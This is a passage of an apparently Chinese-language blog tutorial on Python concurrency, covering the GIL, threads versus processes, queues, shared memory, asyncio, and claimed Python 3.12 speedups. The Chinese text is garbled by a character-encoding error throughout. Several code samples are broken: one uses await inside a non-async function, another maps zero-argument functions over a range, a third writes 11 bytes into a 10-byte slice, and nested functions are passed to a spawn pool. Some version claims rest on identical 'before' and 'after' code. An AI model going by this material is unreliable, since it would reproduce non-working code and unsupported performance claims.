    <span class="hljs-keyword">return</span> <span class="hljs-string">"ç¡é†’äº†"</span>

<span class="hljs-comment"># CPUå¯†é›†å‹ä»»åŠ¡ - å¤šçº¿ç¨‹å¹¶ä¸èƒ½æå‡æ€§èƒ½</span>
start = time.time()
threads = [threading.Thread(target=cpu_bound) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.start()
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.join()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šçº¿ç¨‹CPUä»»åŠ¡è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.2</span>f}</span>ç§’"</span>)

<span class="hljs-comment"># I/Oå¯†é›†å‹ä»»åŠ¡ - å¤šçº¿ç¨‹å¯ä»¥æå‡æ€§èƒ½</span>
start = time.time()
threads = [threading.Thread(target=io_bound) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.start()
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.join()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šçº¿ç¨‹I/Oä»»åŠ¡è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.2</span>f}</span>ç§’"</span>)
</code></pre>
<p>è¿è¡Œç»“æœä¼šè®©ä½ æƒŠè®¶ï¼š</p>
<ul>
<li>å¤šçº¿ç¨‹CPUä»»åŠ¡è€—æ—¶ï¼šâ‰ˆ 8ç§’ï¼ˆå’Œå•çº¿ç¨‹å·®ä¸å¤šï¼ï¼‰</li>
<li>å¤šçº¿ç¨‹I/Oä»»åŠ¡è€—æ—¶ï¼šâ‰ˆ 2ç§’ï¼ˆæ¯”å•çº¿ç¨‹å¿«4å€ï¼ï¼‰</li>
</ul>
<p><strong>ç»“è®º</strong>ï¼šPythonå¤šçº¿ç¨‹åªé€‚åˆI/Oå¯†é›†å‹ä»»åŠ¡ï¼Œå¯¹CPUå¯†é›†å‹ä»»åŠ¡åŸºæœ¬æ²¡ç”¨ã€‚</p>
<h2 data-id="heading-2">Python 3.12çš„é‡å¤§æ›´æ–°ï¼šä¸ºä»€ä¹ˆå¤§å‚éƒ½åœ¨å‡çº§</h2>
<p>å¦‚æœä½ è¿˜åœ¨ç”¨Python 3.11ç”šè‡³æ›´æ—©ç‰ˆæœ¬ï¼Œä½ å¯èƒ½ä¸çŸ¥é“Python 3.12åœ¨å¹¶å‘æ–¹é¢åšäº†é‡å¤§æ”¹è¿›ã€‚</p>
<h3 data-id="heading-3">1. æ›´æ™ºèƒ½çš„GILé‡Šæ”¾ç­–ç•¥</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python 3.12ä¹‹å‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">old_thread_function</span>():
    <span class="hljs-comment"># å³ä½¿åœ¨ç­‰å¾…I/Oæ—¶ï¼Œä¹Ÿå¯èƒ½é•¿æ—¶é—´æŒæœ‰GIL</span>
    <span class="hljs-keyword">import</span> time
    time.sleep(<span class="hljs-number">0.1</span>)  <span class="hljs-comment"># è¿™é‡Œçš„GILé‡Šæ”¾ä¸å¤ŸåŠæ—¶</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"å®Œæˆ"</span>

<span class="hljs-comment"># Python 3.12ä¼˜åŒ–å</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">new_thread_function</span>():
    <span class="hljs-comment"># æ›´æ™ºèƒ½çš„GILé‡Šæ”¾æ—¶æœº</span>
    <span class="hljs-keyword">import</span> time
    time.sleep(<span class="hljs-number">0.1</span>)  <span class="hljs-comment"># GILé‡Šæ”¾æ›´åŠ åŠæ—¶</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"å®Œæˆ"</span>
</code></pre>
<p>è¿™ä¸ªæ”¹è¿›åœ¨çŸ­æ—¶é—´I/Oæ“ä½œä¸­ç‰¹åˆ«æ˜æ˜¾ï¼Œè®©ä½ çš„å¤šçº¿ç¨‹ä»£ç åœ¨Python 3.12ä¸‹è¿è¡Œå¾—æ›´å¿«ã€‚</p>
<h3 data-id="heading-4">2. çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼ˆTLSï¼‰å¤§å¹…ä¼˜åŒ–</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python 3.12çš„çº¿ç¨‹æœ¬åœ°å­˜å‚¨æ›´å¿«</span>
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># çº¿ç¨‹æœ¬åœ°æ•°æ®</span>
thread_local_data = threading.local()

<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>():
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(thread_local_data, <span class="hljs-string">'counter'</span>):
        thread_local_data.counter = <span class="hljs-number">0</span>
    thread_local_data.counter += <span class="hljs-number">1</span>

    <span class="hljs-comment"># åœ¨Python 3.12ä¸­ï¼Œè¿™ç§è®¿é—®æ¯”ä¹‹å‰ç‰ˆæœ¬å¿«30%+</span>
    <span class="hljs-keyword">return</span> thread_local_data.counter

threads = [threading.Thread(target=worker) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>)]
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.start()
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.join()
</code></pre>
<p>å¦‚æœä½ å¤§é‡ä½¿ç”¨çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼Œå‡çº§åˆ°Python 3.12ä¼šè·å¾—æ˜¾è‘—çš„æ€§èƒ½æå‡ã€‚</p>
<h3 data-id="heading-5">3. ThreadPoolExecutoræ€§èƒ½æå‡</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">x</span>):
    time.sleep(<span class="hljs-number">0.01</span>)
    <span class="hljs-keyword">return</span> x * x

<span class="hljs-comment"># Python 3.12ä¸­çš„ThreadPoolExecutoræœ‰æ›´å¥½çš„è°ƒåº¦ç®—æ³•</span>
<span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">50</span>) <span class="hljs-keyword">as</span> executor:
    start = time.time()
    results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(task, <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>)))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Python 3.12è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)
</code></pre>
<p>Python 3.12å¯¹ThreadPoolExecutorçš„è°ƒåº¦ç®—æ³•è¿›è¡Œäº†ä¼˜åŒ–ï¼Œåœ¨å¤§é‡çŸ­ä»»åŠ¡åœºæ™¯ä¸‹æ€§èƒ½æå‡æ˜æ˜¾ã€‚</p>
<h2 data-id="heading-6">å¤šè¿›ç¨‹ï¼šCPUå¯†é›†å‹ä»»åŠ¡çš„æ•‘æ˜Ÿ</h2>
<p>æ—¢ç„¶å¤šçº¿ç¨‹åœ¨CPUå¯†é›†å‹ä»»åŠ¡ä¸Šä¸ç»™åŠ›ï¼Œé‚£æˆ‘ä»¬è¯¥æ€ä¹ˆåŠï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯ï¼š<strong>å¤šè¿›ç¨‹</strong>ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> multiprocessing
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> threading

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_task</span>():
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25_000_000</span>):  <span class="hljs-comment"># å‡å°‘ä¸€ç‚¹é¿å…è·‘å¤ªä¹…</span>
        count += i * i
    <span class="hljs-keyword">return</span> count

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_task_with_threads</span>():
    <span class="hljs-string">"""å¤šçº¿ç¨‹ç‰ˆæœ¬ - åŸºæœ¬æ²¡æœ‰åŠ é€Ÿ"""</span>
    start = time.time()
    threads = [threading.Thread(target=cpu_task) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.start()
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.join()
    <span class="hljs-keyword">return</span> time.time() - start

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_task_with_processes</span>():
    <span class="hljs-string">"""å¤šè¿›ç¨‹ç‰ˆæœ¬ - çœŸæ­£çš„å¹¶è¡Œ"""</span>
    start = time.time()
    processes = [multiprocessing.Process(target=cpu_task) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:
        p.start()
    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:
        p.join()
    <span class="hljs-keyword">return</span> time.time() - start

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># å¿…é¡»è¦åŠ è¿™ä¸ªä¿æŠ¤ï¼</span>
    thread_time = cpu_task_with_threads()
    process_time = cpu_task_with_processes()

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šçº¿ç¨‹è€—æ—¶: <span class="hljs-subst">{thread_time:<span class="hljs-number">.2</span>f}</span>ç§’"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šè¿›ç¨‹è€—æ—¶: <span class="hljs-subst">{process_time:<span class="hljs-number">.2</span>f}</span>ç§’"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šè¿›ç¨‹æ¯”å¤šçº¿ç¨‹å¿«äº† <span class="hljs-subst">{thread_time/process_time:<span class="hljs-number">.1</span>f}</span>å€"</span>)
</code></pre>
<p>åœ¨æˆ‘çš„ç”µè„‘ä¸Šè¿è¡Œç»“æœï¼š</p>
<ul>
<li>å¤šçº¿ç¨‹è€—æ—¶ï¼š7.89ç§’</li>
<li>å¤šè¿›ç¨‹è€—æ—¶ï¼š2.13ç§’</li>
<li>å¤šè¿›ç¨‹æ¯”å¤šçº¿ç¨‹å¿«äº†3.7å€ï¼</li>
</ul>
<h3 data-id="heading-7">ä¸ºä»€ä¹ˆå¤šè¿›ç¨‹èƒ½çªç ´GILé™åˆ¶ï¼Ÿ</h3>
<p>å› ä¸ºæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„Pythonè§£é‡Šå™¨å’ŒGILï¼Œæ‰€ä»¥å¯ä»¥çœŸæ­£åˆ©ç”¨å¤šæ ¸CPUã€‚</p>
<p><strong>å¤šè¿›ç¨‹å°±åƒæ˜¯å¼€äº†å‡ å®¶åˆ†åº—ï¼Œæ¯å®¶åº—éƒ½æœ‰è‡ªå·±çš„å’–å•¡å¸ˆå’Œå’–å•¡æœºã€‚</strong></p>
<h2 data-id="heading-8">è¿›ç¨‹é—´é€šä¿¡ï¼šå¤šè¿›ç¨‹çš„ç”œèœœè´Ÿæ‹…</h2>
<p>å¤šè¿›ç¨‹è™½ç„¶å¼ºå¤§ï¼Œä½†è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰æ˜¯ä¸ªå¤§é—®é¢˜ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œä¸åŒåº—é‡Œçš„å’–å•¡å¸ˆè¦å¦‚ä½•åä½œï¼Ÿ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> multiprocessing
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">queue, result_queue</span>):
    <span class="hljs-string">"""å·¥ä½œè¿›ç¨‹ï¼šä»queueè·å–ä»»åŠ¡ï¼Œç»“æœæ”¾å…¥result_queue"""</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        task = queue.get()
        <span class="hljs-keyword">if</span> task == <span class="hljs-string">'DONE'</span>:
            <span class="hljs-keyword">break</span>
        result = task * task  <span class="hljs-comment"># è®¡ç®—å¹³æ–¹</span>
        result_queue.put(<span class="hljs-string">f"å¤„ç† <span class="hljs-subst">{task}</span>ï¼Œç»“æœ: <span class="hljs-subst">{result}</span>"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-comment"># åˆ›å»ºé˜Ÿåˆ—ç”¨äºè¿›ç¨‹é—´é€šä¿¡</span>
    task_queue = multiprocessing.Queue()
    result_queue = multiprocessing.Queue()

    <span class="hljs-comment"># å¯åŠ¨å·¥ä½œè¿›ç¨‹</span>
    processes = []
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
        p = multiprocessing.Process(target=worker, args=(task_queue, result_queue))
        p.start()
        processes.append(p)

    <span class="hljs-comment"># å‘é€ä»»åŠ¡</span>
    tasks = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>]
    <span class="hljs-keyword">for</span> task <span class="hljs-keyword">in</span> tasks:
        task_queue.put(task)

    <span class="hljs-comment"># å‘é€ç»“æŸä¿¡å·</span>
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
        task_queue.put(<span class="hljs-string">'DONE'</span>)

    <span class="hljs-comment"># æ”¶é›†ç»“æœ</span>
    results = []
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tasks)):
        result = result_queue.get()
        results.append(result)
        <span class="hljs-built_in">print</span>(result)

    <span class="hljs-comment"># ç­‰å¾…è¿›ç¨‹ç»“æŸ</span>
    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:
        p.join()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
<h3 data-id="heading-9">Python 3.12çš„IPCä¼˜åŒ–</h3>
<p>Python 3.12å¯¹è¿›ç¨‹é—´é€šä¿¡åšäº†é‡è¦ä¼˜åŒ–ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> multiprocessing.shared_memory <span class="hljs-keyword">as</span> shared_memory
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

<span class="hljs-comment"># Python 3.12ä¸­ï¼Œå…±äº«å†…å­˜æ“ä½œæ›´å¿«</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">shared_memory_example</span>():
    <span class="hljs-comment"># åˆ›å»ºå…±äº«å†…å­˜å—</span>
    shm = shared_memory.SharedMemory(create=<span class="hljs-literal">True</span>, size=<span class="hljs-number">1024</span>)

    <span class="hljs-comment"># åœ¨ä¸åŒè¿›ç¨‹ä¸­è®¿é—®åŒä¸€å—å†…å­˜</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">writer</span>():
        shm.buf[:<span class="hljs-number">10</span>] = <span class="hljs-string">b'Hello World'</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reader</span>():
        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(shm.buf[:<span class="hljs-number">10</span>]))

    <span class="hljs-comment"># è¿™ç§æ–¹å¼æ¯”ä¼ ç»Ÿçš„Queueå¿«å¾ˆå¤š</span>
</code></pre>
<h2 data-id="heading-10">å®æˆ˜ï¼šé€‰æ‹©åˆé€‚çš„å¹¶å‘ç­–ç•¥</h2>
<p>å¥½äº†ï¼Œç†è®ºè®²å®Œäº†ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å®é™…é¡¹ç›®ä¸­è¯¥å¦‚ä½•é€‰æ‹©ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> multiprocessing
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, ProcessPoolExecutor

<span class="hljs-keyword">def</span> <span class="hljs-title function_">io_heavy_task</span>():
    <span class="hljs-string">"""I/Oå¯†é›†å‹ï¼šç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶è¯»å†™ã€æ•°æ®åº“æ“ä½œ"""</span>
    time.sleep(<span class="hljs-number">0.1</span>)  <span class="hljs-comment"># æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"I/Oæ“ä½œå®Œæˆ"</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_heavy_task</span>():
    <span class="hljs-string">"""CPUå¯†é›†å‹ï¼šå¤§é‡è®¡ç®—ã€å›¾åƒå¤„ç†ã€æ•°æ®åˆ†æ"""</span>
    count = <span class="hljs-built_in">sum</span>(i * i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100_000</span>))
    <span class="hljs-keyword">return</span> count

<span class="hljs-keyword">def</span> <span class="hljs-title function_">async_io_task</span>():
    <span class="hljs-string">"""å¼‚æ­¥I/Oï¼šé€‚åˆé«˜å¹¶å‘ç½‘ç»œè¯·æ±‚"""</span>
    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">0.1</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">"å¼‚æ­¥I/Oå®Œæˆ"</span>

<span class="hljs-comment"># æµ‹è¯•ä¸åŒç­–ç•¥</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_strategies</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"=== æµ‹è¯•I/Oå¯†é›†å‹ä»»åŠ¡ ==="</span>)

    <span class="hljs-comment"># 1. å¤šçº¿ç¨‹</span>
    start = time.time()
    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">10</span>) <span class="hljs-keyword">as</span> executor:
        results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(io_heavy_task, <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šçº¿ç¨‹è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)

    <span class="hljs-comment"># 2. å¼‚æ­¥ï¼ˆI/Oä»»åŠ¡çš„æœ€ä½³é€‰æ‹©ï¼‰</span>
    start = time.time()
    tasks = [async_io_task() <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)]
    results = <span class="hljs-keyword">await</span> asyncio.gather(*tasks)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¼‚æ­¥åç¨‹è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)

    <span class="hljs-comment"># 3. å¤šè¿›ç¨‹ï¼ˆä¸é€‚åˆI/Oä»»åŠ¡ï¼‰</span>
    start = time.time()
    <span class="hljs-keyword">with</span> ProcessPoolExecutor(max_workers=<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> executor:
        results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(io_heavy_task, <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šè¿›ç¨‹è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== æµ‹è¯•CPUå¯†é›†å‹ä»»åŠ¡ ==="</span>)

    <span class="hljs-comment"># 1. å¤šçº¿ç¨‹ï¼ˆä¸é€‚åˆCPUä»»åŠ¡ï¼‰</span>
    start = time.time()
    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">10</span>) <span class="hljs-keyword">as</span> executor:
        results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(cpu_heavy_task, <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šçº¿ç¨‹è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)

    <span class="hljs-comment"># 2. å¤šè¿›ç¨‹ï¼ˆCPUä»»åŠ¡çš„æœ€ä½³é€‰æ‹©ï¼‰</span>
    start = time.time()
    <span class="hljs-keyword">with</span> ProcessPoolExecutor(max_workers=<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> executor:
        results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(cpu_heavy_task, <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šè¿›ç¨‹è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    asyncio.run(test_strategies())
</code></pre>
<p><strong>è¿è¡Œç»“æœæ€»ç»“ï¼š</strong></p>

























<table><thead><tr><th>ä»»åŠ¡ç±»å‹</th><th>æœ€ä½³ç­–ç•¥</th><th>æ€§èƒ½æ’å</th></tr></thead><tbody><tr><td>I/Oå¯†é›†å‹</td><td>å¼‚æ­¥åç¨‹</td><td>å¼‚æ­¥ &gt; å¤šçº¿ç¨‹ &gt; å¤šè¿›ç¨‹</td></tr><tr><td>CPUå¯†é›†å‹</td><td>å¤šè¿›ç¨‹</td><td>å¤šè¿›ç¨‹ &gt; å¤šçº¿ç¨‹ &gt; å•çº¿ç¨‹</td></tr><tr><td>æ··åˆå‹</td><td>å¼‚æ­¥ + å¤šè¿›ç¨‹</td><td>æ ¹æ®å…·ä½“åœºæ™¯ç»„åˆ</td></tr></tbody></table>
<h2 data-id="heading-11">Python 3.12å®ç”¨æŠ€å·§æ±‡æ€»</h2>
<p>åŸºäºPython 3.12çš„æ–°ç‰¹æ€§ï¼Œè¿™é‡Œæœ‰ä¸€äº›å®ç”¨çš„å¹¶å‘ç¼–ç¨‹æŠ€å·§ï¼š</p>
<h3 data-id="heading-12">1. æ™ºèƒ½ä»»åŠ¡è°ƒåº¦</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, as_completed
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">smart_task_scheduler</span>():
    <span class="hljs-string">"""Python 3.12ä¸­çš„æ™ºèƒ½ä»»åŠ¡è°ƒåº¦"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">task_id, difficulty</span>):
        <span class="hljs-comment"># æ¨¡æ‹Ÿä¸åŒéš¾åº¦çš„ä»»åŠ¡</span>
        time.sleep(difficulty)
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"ä»»åŠ¡<span class="hljs-subst">{task_id}</span>å®Œæˆ"</span>

    <span class="hljs-comment"># ä»»åŠ¡åˆ—è¡¨ï¼ˆID, éš¾åº¦ï¼‰</span>
    tasks = [(<span class="hljs-number">1</span>, <span class="hljs-number">0.1</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">0.3</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">0.1</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">0.5</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">0.1</span>)]

    <span class="hljs-comment"># Python 3.12çš„ThreadPoolExecutoræœ‰æ›´å¥½çš„è´Ÿè½½å‡è¡¡</span>
    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> executor:
        <span class="hljs-comment"># æŒ‰éš¾åº¦æ’åºï¼ŒçŸ­ä»»åŠ¡ä¼˜å…ˆï¼ˆå‡å°‘é˜»å¡ï¼‰</span>
        tasks.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>])

        futures = [executor.submit(task, tid, diff) <span class="hljs-keyword">for</span> tid, diff <span class="hljs-keyword">in</span> tasks]

        <span class="hljs-comment"># as_completedåœ¨3.12ä¸­æ€§èƒ½æ›´å¥½</span>
        <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(futures):
            result = future.result()
            <span class="hljs-built_in">print</span>(result)
</code></pre>
<h3 data-id="heading-13">2. è¿›ç¨‹æ± çš„æ”¹è¿›ç”¨æ³•</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> get_context
<span class="hljs-keyword">import</span> multiprocessing <span class="hljs-keyword">as</span> mp

<span class="hljs-keyword">def</span> <span class="hljs-title function_">improved_process_pool</span>():
    <span class="hljs-string">"""Python 3.12çš„è¿›ç¨‹æ± æœ€ä½³å®è·µ"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">x</span>):
        <span class="hljs-keyword">return</span> x * x

    <span class="hljs-comment"># ä½¿ç”¨get_contextè·å¾—æ›´å¥½çš„è¿›ç¨‹ç®¡ç†</span>
    context = get_context(<span class="hljs-string">"spawn"</span>)  <span class="hljs-comment"># spawnæ¨¡å¼æ›´å®‰å…¨</span>

    <span class="hljs-comment"># Python 3.12ä¸­è¿›ç¨‹æ± çš„é”™è¯¯å¤„ç†æ›´å¥½</span>
    <span class="hljs-keyword">with</span> context.Pool(processes=<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> pool:
        <span class="hljs-keyword">try</span>:
            results = pool.<span class="hljs-built_in">map</span>(worker, <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>))
            <span class="hljs-built_in">print</span>(results)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è¿›ç¨‹æ± å‡ºé”™: <span class="hljs-subst">{e}</span>"</span>)
            pool.terminate()  <span class="hljs-comment"># 3.12ä¸­æ›´å¯é çš„æ¸…ç†</span>
</code></pre>
<h3 data-id="heading-14">3. å¼‚æ­¥ä¸å¤šè¿›ç¨‹çš„æ··åˆä½¿ç”¨</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ProcessPoolExecutor

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">hybrid_approach</span>():
    <span class="hljs-string">"""å¼‚æ­¥ + å¤šè¿›ç¨‹ï¼šPython 3.12çš„é«˜æ€§èƒ½ç»„åˆ"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_bound_task</span>(<span class="hljs-params">x</span>):
        <span class="hljs-comment"># CPUå¯†é›†å‹è®¡ç®—</span>
        result = <span class="hljs-built_in">sum</span>(i * i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(x))
        <span class="hljs-keyword">return</span> result

    <span class="hljs-comment"># åœ¨å¼‚æ­¥å¾ªç¯ä¸­ä½¿ç”¨è¿›ç¨‹æ± </span>
    loop = asyncio.get_event_loop()

    <span class="hljs-keyword">with</span> ProcessPoolExecutor(max_workers=<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> executor:
        tasks = []
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>):
            <span class="hljs-comment"># å°†CPUä»»åŠ¡æäº¤åˆ°è¿›ç¨‹æ± </span>
            task = loop.run_in_executor(executor, cpu_bound_task, i * <span class="hljs-number">10000</span>)
            tasks.append(task)

        <span class="hljs-comment"># å¼‚æ­¥ç­‰å¾…æ‰€æœ‰CPUä»»åŠ¡å®Œæˆ</span>
        results = <span class="hljs-keyword">await</span> asyncio.gather(*tasks)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ··åˆæ¨¡å¼ç»“æœ: <span class="hljs-subst">{results}</span>"</span>)
</code></pre>
<h2 data-id="heading-15">è¸©å‘æŒ‡å—ï¼šè¡€æ³ªæ•™è®­</h2>
